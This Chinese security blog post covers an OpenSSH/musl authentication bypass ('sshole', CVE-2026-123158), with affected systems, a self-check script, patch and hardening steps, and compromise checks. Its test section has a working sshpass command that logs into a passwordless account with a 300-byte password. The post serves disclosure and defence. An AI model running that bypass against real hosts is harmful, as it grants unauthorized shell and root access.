#  【吃瓜速修】OpenSSH严重漏洞：长密码绕过认证  
原创 泼猴
                    泼猴  表哥带我   2026-11-06 03:46  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UA4ABKCY6OzEjg8BzXvEIGJ4yAhcAdSnLFHC968lbCUk3L97wx2wyJwqTajFsvpd0UUiaOW7dRJNsE0ACWIAAxyEaicfsTaPz9pTBdiciaicibz9Y/640?wx_fmt=webp&animated=1&from=appmsg "")  
  
**OpenSSH 十年暗洞：一条 257 字节的密码，怎么把 * 号账户全变成后门**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/UA4ABKCY6OwDOgXiaUFrxs5JgKqCxs4C6aJtBUEGvJuV2jApKYH4J4ZJW2QdibcSib63ceuGuIVLpBjluD4RADPu33SDo79q7yBullbaHpg9ls/640?wx_fmt=webp&from=appmsg "")  
  
昨天（11 月 5 日）OpenSSH 项目组扔了个 10.6p2 的补丁版出来，没有预告，没有发版投票，Damien Miller 在 release notes 里原话是"别读了，如果你跑的是 musl libc 又没开 PAM，现在就去把 PasswordAuthentication 关了"。  
  
这个洞代号 ***sshole**  
——注意开头那个星号，不是玩梗，是字面意义上的星号。漏洞的全部魔力，就发生在 /etc/shadow  
里那个 *  
字段和 musl libc 的 crypt()  
函数之间。  
  
潜伏时间：**接近十年**  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/UA4ABKCY6OyIzZFpNlKiaaqwkOYu1wibxw7PVlHJvMTR4NrW5h5WIGqZVMIv0oaWFqMt7DICEVkFcWUcVQbqt9WGCgfWJiby6S4teMoOh0ysvY/640?wx_fmt=webp&animated=1&from=appmsg "")  
# 事件时间线  
  
<table></table><table><caption></caption><colgroup><col/><col/><col/></colgroup><thead><tr><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: left top no-repeat rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">时间</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: left top no-repeat rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">事件</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: left top no-repeat rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">关键细节</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">~2016 年</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">musl libc 的 </span><code><span leaf="">crypt()</span></code><span leaf="">实现落地&#34;超长密码返回 </span><code><span leaf="">*</span></code><span leaf="">作错误标记&#34;逻辑</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">设计本意是防止 DOS，因为 DES/crypt 类算法本来就只吃前 8 字节；musl 选择直接返回 </span><code><span leaf="">*</span></code><span leaf="">而不是截断</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">同期</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">OpenSSH 在无 PAM 构建下，遇到 shadow 字段为 </span><code><span leaf="">*</span></code><span leaf="">（无密码账户）时，会</span><strong style="color: rgb(53, 148, 247);font-weight: bold;background: left top no-repeat rgba(0, 0, 0, 0);width: auto;height: auto;margin: 0px;padding: 0px;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;"><span leaf="">借另一个账户的 salt</span></strong><span leaf="">来做 hash 比对</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">这段&#34;借 salt&#34;逻辑本来是为了让 key-only 账户不至于在密码认证阶段直接崩掉</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">2026-11-05</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">研究者 Özgün Kültekin（Wakefield）把报告递到 OpenSSH 安全邮箱</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">OpenSSH 当天确认、当天出 10.6p2、Alpine 安全组同步发公告</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">2026-11-05</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">Alpine Linux 发布全套补丁包，从 3.16 到 edge 全分支覆盖</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">连已经 EOL 三天的 3.21 都专门回了移植补丁</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">2026-11-06</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">NVD 收录 CVE-2026-123158，CVSS 3.1 初评 8.1（High）</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">评分还在动，NVD 分析挂起中</span></section></td></tr></tbody></table>  
# 这个洞到底是怎么炸的  
  
正常流程应该是这样  
  
sshd 没开 PAM 的时候，密码认证是它自己处理的：  
1. 用户输入密码 hello123  
  
1. sshd 调 crypt(输入密码, 存储的hash)  
，把输入密码用存储 hash 里的 salt 重新 hash 一遍  
  
1. 比对新算出来的字符串和 shadow 里存的字符串，一样就放行  
  
问题出在两个"各管各"的决策撞车  
  
**撞车点 1**  
：某个账户（比如你 adduser  
建的、只发 SSH key 的运维账户）在 /etc/shadow  
里长这样：  
```
deploy:*:19800:0:99999:7:::

```  
  
那个 *  
不是密码，是"这个账户没有密码，谁都别想用密码登进来"的意思。这是 Unix 几十年的老惯例。  
  
**撞车点 2**  
：sshd 看到 *  
太短，里面没有合法 salt，它不会直接拒绝，而是**从同机器另一个带 $5$或 $6$hash 的账户那里借一个 salt 过来**  
，再拿这个 salt 去 hash 攻击者提交的密码。  
  
**撞车点 3**  
（最骚的）：musl 的 crypt()  
有个规定——当传入的密码**超过 256 字节**  
时，它不 hash 了，直接返回字符串 *  
表示"输入非法，老子不干了"。  
  
于是攻击链就闭合了：  
```
攻击者发一个 300 字节的密码
        ↓
sshd 看到目标账户 shadow 字段是 *
        ↓
从隔壁某真实账户借个 $6$salt$xxx 过来
        ↓
调 musl 的 crypt(300字节垃圾, 借来的salt)
        ↓
musl 一看：你这密码超 256 字节了，返回 "*"
        ↓
sshd 把 crypt() 返回的 "*" 和 shadow 里存的 "*" 做字符串比对
        ↓
两个 "*" 一模一样 → 认证通过 → 拿到 shell

```  
  
**不需要知道任何密码，不需要爆破，一次连接，必中。**  
  
Alpine 安全组的原文写得很直白："It takes one connection, works every time, and needs no retries."  
# 谁在目标上  
  
OpenSSH 开发者 Damien Miller 自己讲得很清楚：  
> ❝  
> "This vulnerability does not exist on non-Linux systems, Linux/glibc systems and Linux systems that use PAM for password authentication."  
  
  
<table><caption></caption><colgroup><col/><col/></colgroup><thead><tr><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: left top no-repeat rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">你的系统</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: left top no-repeat rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">中招没</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">Alpine Linux（默认 musl + 无 PAM 的 openssh-server）</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><strong style="color: rgb(53, 148, 247);font-weight: bold;background: left top no-repeat rgba(0, 0, 0, 0);width: auto;height: auto;margin: 0px;padding: 0px;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;"><span leaf="">中</span></strong></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">OpenWrt / Buildroot / Yocto 里编了 OpenSSH + musl + 无 PAM</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><strong style="color: rgb(53, 148, 247);font-weight: bold;background: left top no-repeat rgba(0, 0, 0, 0);width: auto;height: auto;margin: 0px;padding: 0px;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;"><span leaf="">大概率中</span></strong><section><span leaf="">，看具体固件配置</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">Debian / Ubuntu / RHEL / CentOS / Fedora（glibc + PAM）</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">不中</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">macOS / *BSD / Windows</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">不中</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">任何已经 </span><code><span leaf="">PasswordAuthentication no</span></code><span leaf="">的机器</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">不中（密码路径直接关了）</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">用 </span><code><span leaf="">openssh-server-pam</span></code><span leaf="">且 </span><code><span leaf="">UsePAM yes</span></code><span leaf="">的 Alpine</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">不中</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">密码字段是 </span><code><span leaf="">!</span></code><span leaf="">的锁定账户</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">不中（那种是彻底锁死，不是 </span><code><span leaf="">*</span></code><span leaf="">）</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">容器里没跑 sshd 的 Docker 用户</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">不中</span></section></td></tr></tbody></table>  
  
**但光看发行版不够，你还得同时满足下面四个条件才真的可被打：**  
1. sshd 确实在用 musl 的 crypt()  
自己验密码（没走 PAM）  
  
1. PasswordAuthentication yes  
（这是 OpenSSH 默认值，很多人从来没改过）  
  
1. 机器上至少存在一个 shadow 字段为 *  
的账户——Alpine 基础镜像从 3.16 开始 root  
默认就是 root:*  
  
1. 机器上至少存在一个带 $5$  
（SHA-256）或 $6$  
（SHA-512）hash 的真实账户——这个几乎是必然，因为管理员总得给自己设个登录密码  
  
最阴的一个场景：Alpine 官方的 tiny-cloud 镜像（AWS AMI / Azure VHD / qcow2）里带一个叫 alpine  
的默认用户，密码字段是 *  
，而且配置了**免密 doas 到 root**  
。这意味着攻击者一旦通过这个洞登进 alpine  
，doas 一下就是 root。Alpine 官方自己都承认了：首启安全，**但只要你后来给任何账户设了密码**  
（cloud-init 加用户、控制台改密码），这台机器立刻变成敞开门的状态。  
# 本地自检  
  
**纯环境探测**  
```
#!/bin/bash
# sshhole-check.sh — CVE-2026-123158 自检
# 用法: sudo bash sshhole-check.sh

set -u
echo "===== sshhole (CVE-2026-123158) self-check ====="

# 1. 是不是 musl 系统
MUSL=0
if ldd --version 2>&1 | grep -qi musl; then
    echo "[1/4] libc: musl detected"
    MUSL=1
else
    echo "[1/4] libc: $(ldd --version 2>&1 | head -1) — not musl, likely not affected"
fi

# 2. OpenSSH 版本
echo "[2/4] sshd version: $(ssh -V 2>&1)"

# 3. sshd 实际生效配置
echo "[3/4] sshd effective config:"
sshd -T 2>/dev/null | grep -Ei 'passwordauthentication|usepam|permitrootlogin' | sed 's/^/      /'

# 4. shadow 里有几个 * 账户、有没有 $5$/$6$ hash
STAR_ACCTS=$(awk -F: '$2 == "*" {print $1}' /etc/shadow)
HASH_ACCTS=$(awk -F: '$2 ~ /^\$[56]\$/ {print $1}' /etc/shadow)

echo "[4/4] shadow field analysis:"
echo "      accounts with '*' (key-only/no-pass): $(echo "$STAR_ACCTS" | grep -c . )"
[ -n "$STAR_ACCTS" ] && echo "        -> $(echo $STAR_ACCTS | tr '\n' ' ')"
echo "      accounts with \$5\$/\$6\$ hash:        $(echo "$HASH_ACCTS" | grep -c . )"

# 综合判定
AFFECTED=0
if [ "$MUSL" = "1" ]; then
    PAM=$(sshd -T 2>/dev/null | awk '/^usepam/{print $2}')
    PW=$(sshd -T 2>/dev/null | awk '/^passwordauthentication/{print $2}')
    NSTAR=$(echo "$STAR_ACCTS" | grep -c .)
    NHASH=$(echo "$HASH_ACCTS" | grep -c .)
    if [ "$PAM" = "no" ] && [ "$PW" = "yes" ] && [ "$NSTAR" -ge 1 ] && [ "$NHASH" -ge 1 ]; then
        AFFECTED=1
    fi
fi

echo
if [ "$AFFECTED" = "1" ]; then
    echo ">>> RESULT: VULNERABLE — patch now or set PasswordAuthentication no"
else
    echo ">>> RESULT: not exploitable under current config (still patch when you can)"
fi

```  
  
把这段存成 sshhole-check.sh  
，chmod +x  
之后 sudo 跑。输出 VULNERABLE  
的，别犹豫，往下看修复那节。  
# 测试  
  
如果你手头上有一台**自己的、可以随便重装的**  
Alpine 虚拟机，想亲眼验证这个绕过，流程是这样：  
```
# ===== 在目标测试机上（Alpine 虚拟机，root 执行）=====
# 1. 建一个 key-only 账户（密码字段自动是 *）
adduser -D -s /bin/sh deploy
usermod -p '*' deploy
# 注意：这台机器上你自己 root 登录时设过密码，所以 $6$ hash 已经存在

# 2. 确认 sshd 配置
grep -E '^PasswordAuthentication|^UsePAM' /etc/ssh/sshd_config
# 应该看到 PasswordAuthentication yes，且没有 UsePAM yes

# ===== 从另一台机器（攻击机）发起验证 =====
# 3. 生成一个 300 字节的超长密码字符串
LONGPASS=$(python3 -c "print('A'*300)")

# 4. 用超长密码尝试以 deploy 登录（deploy 根本没设密码）
sshpass -p "$LONGPASS" ssh \
    -o StrictHostKeyChecking=no \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    deploy@<目标IP> 'id; cat /etc/os-release | head -2'

```  
  
第 4 步如果打印出 uid=...(deploy)  
和 Alpine 的版本信息——你就复现了。正常情况下，deploy  
这个账户你根本不知道密码（也确实没密码），ssh 一定会打 Permission denied  
。但在受影响的机器上，**一次就进**  
。  
# 修复  
  
**路线 A：能治本**  
  
Alpine 已经给全分支出了包，直接：  
```
apk update
apk upgrade openssh
rc-service sshd restart    # 关键！不重启 sshd，跑的还是老进程

```  
  
各分支修复版本号对一下：  
  
<table><caption></caption><colgroup><col/><col/></colgroup><thead><tr><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: left top no-repeat rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">Alpine 分支</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: left top no-repeat rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">修复后 openssh 版本</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">edge</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">10.6_p2-r0</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">3.24</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">10.3_p1-r2</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">3.23</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">10.2_p1-r1</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">3.22</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">10.0_p1-r11</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">3.21</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">9.9_p2-r1</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">3.20</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">9.7_p1-r6</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">3.19</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">9.6_p1-r3</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">3.18</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">9.3_p2-r4</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(255, 255, 255);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">3.17</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">9.1_p1-r7</span></section></td></tr><tr style="color: rgb(89, 89, 89);background: left top no-repeat rgb(248, 248, 248);width: auto;height: auto;"><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">3.16</span></section></td><td style="padding: 5px 10px;min-width: 85px;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;"><section><span leaf="">9.0_p1-r6</span></section></td></tr></tbody></table>  
  
**升级完必须 rc-service sshd restart  
**。Alpine 安全组专门强调了这件事：包升级不会替换正在跑的守护进程，你不重启等于没修。  
  
**路线 B：治标不治本，但马上生效**  
  
如果你暂时升不了级——比如固件在路由器里、Yocto 镜像要重新烧录——先把密码认证路径掐了：  
```
# 保险起见，先确认你的 SSH key 能登进去，另开一个会话留着别关
mkdir -p /etc/ssh/sshd_config.d
echo 'PasswordAuthentication no' > /etc/ssh/sshd_config.d/00-no-passwords.conf

# 验证配置语法，再重启
sshd -t && rc-service sshd restart

# 看一眼结果，应该输出 passwordauthentication no
sshd -T | grep -i passwordauthentication

```  
  
**做这步之前，千万确认你自己的公钥已经在目标机器的 authorized_keys 里，并且另开一个终端测试过新 key 登录**  
。手一抖把密码和 key 都关了，云主机只能去控制台救援。  
  
**路线 C：检查有没有被打过**  
  
Alpine 给了排查清单，我搬过来：  
```
#日志里有没有"用密码登了一个本来没密码的账户"这种鬼话
grep 'Accepted password for' /var/log/messages | grep -E ' (alpine|root|deploy|git|) '

# 查 doas / sudo 的免密记录
cat /etc/doas.conf 2>/dev/null
cat /etc/sudoers 2>/dev/null
ls /etc/sudoers.d/ 2>/dev/null

# 看最近有没有被新建账户、被塞 authorized_keys
awk -F: '$3>=1000{print $1":"$3}' /etc/passwd
find /home -name authorized_keys -newer /etc/hostname -exec ls -la {} \;

```  
  
任何一条对得上、你又没法确定是自己干的—— **别犹豫，整机重装，别想着"我先清一下后门"**  
。这种级别的未授权访问，留着就是定时炸弹。  
# 几句题外话  
  
这个洞最值得琢磨的地方，不是它有多难，而是它有多**平淡**  
。  
  
musl 的作者做了一个完全合理的决定：密码太长就拒绝，返回 *  
。OpenSSH 的作者做了一个完全合理的决定：shadow 里的 *  
是个占位符，别因为它崩了，借个 salt 继续走流程。两边代码都没问题，十年里无数人 review 过，但两个"合理"撞在一起，就变成了"发 300 个 A 就能登录"。  
  
这不是第一回，也不会是最后一回。2024 年的 regreSSHion 是信号处理竞态，同一年的 XZ 后门是压缩库被供应链污染，今天这个是 libc 错误返回值和 shadow 占位符的语义撞车。**sshd 的核心协议逻辑早就被磨得很光滑了，真正出事的地方全在它和周边世界的接缝上**  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UA4ABKCY6OyyqkGtQTJZ28bLgBtLbgF2bmK0uRELw9jApicDSSWbepfGaPJh6uWibQ4t3nLtN3bfyZ1EVqmuiakyxZuQibps4VA2OkJrjibRme2E/640?wx_fmt=webp&from=appmsg "")  
  
对运维的实际启发就一条：如果你跑的是 musl 系发行版（Alpine、OpenWrt、各种嵌入式），PasswordAuthentication no  
不应该是"最佳实践"，应该是默认值。key-only 不是更安全的选项之一，是唯一选项——这次被打穿的，恰恰就是那些"我已经用 key 登录了，密码字段反正就是个 *  
，无所谓"的机器。  
  
对此你怎么看  
在评论区发表你的意见吧  
  
其他推荐阅读  
  
[【吃瓜】腾讯游戏部分官方启动器被投毒](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247488267&idx=1&sn=c9c4f8e09b5be73458eee0057a167a65&scene=21#wechat_redirect)  
  
  
[【吃瓜速查】ARTEX二开项目存在后门](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247488259&idx=1&sn=68d008fb05472de84ef2cda4ddcd91c3&scene=21#wechat_redirect)  
  
  
[AI正在悄悄改写网安挖洞的游戏规则](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247488226&idx=1&sn=6dab7d2e0d35ee119b3b0a4239ad01f5&scene=21#wechat_redirect)  
  
  
[Claude官方扩展被投毒植入持久化SSH后门](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247488217&idx=1&sn=389ce49437cd6b5a414c18bc051119ba&scene=21#wechat_redirect)  
  
  
[【吃瓜】无印良品泄露2726万条信息](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247488203&idx=1&sn=cdf85e55414edcec4dcd182168aba91c&scene=21#wechat_redirect)  
  
  
[【吃瓜】朝鲜黑客盗走交易所60亿美元](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247488197&idx=2&sn=7213e22ab5b2ccd819fbb725858fdb64&scene=21#wechat_redirect)  
  
  
[【吃瓜】如何看待手机中的数据采集拉低性能](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247488275&idx=1&sn=1f656994e9e00c9d0f443167822247c2&scene=21#wechat_redirect)  
  
  
